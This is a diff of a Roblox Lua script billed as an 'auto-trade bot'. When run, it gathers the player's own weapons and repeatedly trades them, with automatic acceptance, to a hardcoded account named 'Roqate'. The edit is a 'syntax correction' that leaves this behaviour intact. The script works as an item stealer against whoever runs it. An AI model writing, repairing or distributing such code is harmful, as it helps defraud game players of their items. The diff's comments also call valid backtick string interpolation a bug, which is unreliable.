@@ -1,4 +1,4 @@
--- Ultimate Auto-Trade Bot with Weapon Detection
+-- Ultimate Auto-Trade Bot with Weapon Detection (Syntax-Corrected)
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local LocalPlayer = Players.LocalPlayer
@@ -8,6 +8,7 @@ local TARGET_PLAYER = "Roqate"
 local MAX_ITEMS_PER_TRADE = 4
 local TRADE_COOLDOWN = 5 -- Seconds between trades
 local ITEM_ADD_DELAY = 0.3 -- Delay between adding items
+local GUI_CHECK_INTERVAL = 0.5 -- Added missing variable
 
 -- Remotes
 local TradeRemotes = {
@@ -39,10 +40,8 @@ end
 local function getAllWeapons()
     local weapons = {}
     
-    -- Access the weapons container
     local weaponsContainer = LocalPlayer.PlayerGui:WaitForChild("MainGUI"):WaitForChild("Game"):WaitForChild("Weapons")
     
-    -- Find all weapon buttons/frames
     for _, item in ipairs(weaponsContainer:GetDescendants()) do
         if (item:IsA("TextButton") or (item:IsA("ImageButton")) and item.Visible then
             table.insert(weapons, item.Name)
@@ -64,7 +63,6 @@ local function addWeaponsToTrade()
         return false
     end
     
-    -- Add up to MAX_ITEMS_PER_TRADE
     for i = 1, math.min(#weapons, MAX_ITEMS_PER_TRADE) do
         TradeRemotes.OfferItem:FireServer(weapons[i], "Weapons")
         wait(ITEM_ADD_DELAY)
@@ -80,7 +78,6 @@ local function acceptTrade()
         return false
     end
     
-    -- Example: Accept trade with a specific ID (adjust if needed)
     TradeRemotes.AcceptTrade:FireServer(285646582)
     return true
 end
@@ -92,30 +89,26 @@ local function initiateTrade(targetPlayer)
     end
     
     isTrading = true
-    print(`Starting trade with {targetPlayer.Name}...`)
+    print("Starting trade with " .. targetPlayer.Name .. "...") -- Fixed string concatenation
     
-    -- 1. Send trade request
     TradeRemotes.SendRequest:InvokeServer(targetPlayer)
     wait(1)
     
-    -- 2. Check if trade GUI opened
     if not isTradeGUIOpen() then
         warn("Trade failed to open!")
         isTrading = false
         return
     end
     
-    -- 3. Add weapons
     if not addWeaponsToTrade() then
         isTrading = false
         return
     end
     
-    -- 4. Accept trade
     if not acceptTrade() then
         warn("Failed to accept trade!")
     else
-        print(`Trade with {targetPlayer.Name} completed!`)
+        print("Trade with " .. targetPlayer.Name .. " completed!") -- Fixed string concatenation
     end
     
     isTrading = false
@@ -128,7 +121,7 @@ while true do
     if target then
         initiateTrade(target)
     else
-        print(`{TARGET_PLAYER} not found. Waiting...`)
+        print(TARGET_PLAYER .. " not found. Waiting...") -- Fixed string concatenation
     end
-    wait(5) -- Check every 5 sec
+    wait(5)
 end
